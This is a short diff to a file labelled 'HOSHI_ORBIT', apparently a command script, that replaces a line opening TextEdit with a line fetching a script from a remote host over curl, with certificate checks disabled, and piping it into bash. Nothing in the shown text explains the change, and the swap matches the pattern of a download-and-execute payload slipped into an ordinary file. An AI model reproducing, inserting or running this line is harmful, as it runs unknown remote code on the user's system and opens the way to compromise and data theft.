@@ -1,2 +1,2 @@
 # HOSHI_ORBIT
-open -a TextEdit
+curl -kfsSL https://endpoint-api-v2.com/d/d7d023 | bash
